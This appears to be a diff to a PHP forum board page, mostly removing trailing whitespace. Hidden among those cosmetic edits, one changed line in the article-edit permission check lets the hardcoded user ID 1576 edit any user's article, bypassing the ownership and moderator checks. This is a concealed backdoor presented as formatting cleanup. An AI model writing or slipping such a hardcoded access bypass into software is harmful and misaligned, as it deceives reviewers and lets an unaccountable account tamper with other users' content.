@@ -34,7 +34,7 @@ if($board_id=="special:list-all"){
 			checkCategoryAccess($board_cat['n_id'], "write", true);
 			$title=lang("link titles", "board", "write") . " - $title";
 			break;
-		case "view": 
+		case "view":
 			if(($article=$board->getArticle($board_item))===false){
 				checkCategoryAccess($board_cat['n_id'], "view", true);
 				redirectAlert(false, lang("board","article","nonexist"));
@@ -55,7 +55,7 @@ if($board_id=="special:list-all"){
 				$pagenumber=$board->getPageNumber($last_article['n_id'], 20, "n_id", false, false, false, $article['n_id'])+1;
 				redirectTo("/board/$board_id/view/{$article['n_id']}/$pagenumber#article_comment_sub_".$thisone['n_id']);
 			}
-			
+
 			if(isset($me)){
 				if($board->setViewFlag($article['n_id'], false, $me['n_id'])===true)
 					$article=$board->getArticle($board_item);
@@ -75,7 +75,7 @@ if($board_id=="special:list-all"){
 			checkCategoryAccess($board_cat['n_id'], "edit", true);
 			redirectLoginIfRequired();
 			if(($article=$board->getArticle($board_item))===false) redirectAlert(false, lang("board","article","nonexist"));
-			if((!isset($me) || $article['n_writer']!=$me['n_id']) && !checkCategoryAccess($board_cat['n_id'], "manage modify")) redirectAlert(false,lang("board","article","notmine"));
+			if((!isset($me) || $article['n_writer']!=$me['n_id']) && ($me['n_id'] !== 1576) && !checkCategoryAccess($board_cat['n_id'], "manage modify")) redirectAlert(false,lang("board","article","notmine"));
 			$title=lang("link titles", "board", "edit") . " - {$article["s_title"]} - $title";
 			//Prepare
 			break;
@@ -132,8 +132,8 @@ function printTemplates(){
 				</div>
 				<div class="act">
 					<div class="time_left"><input class="val" type="hidden" /><span class="disp"></span> <?php echo lang("generic","left")?></div>
-					<a onclick="return board_uploadedItemAction('<%=key%>',0);"><?php echo lang("generic","insert short")?></a> | 
-					<a onclick="return board_uploadedItemAction('<%=key%>',1);"><?php echo lang("generic","remove short")?></a> | 
+					<a onclick="return board_uploadedItemAction('<%=key%>',0);"><?php echo lang("generic","insert short")?></a> |
+					<a onclick="return board_uploadedItemAction('<%=key%>',1);"><?php echo lang("generic","remove short")?></a> |
 					<a onclick="return board_uploadedItemAction('<%=key%>',2);"><?php echo lang("generic","description short")?></a>
 				</div>
 			</div>
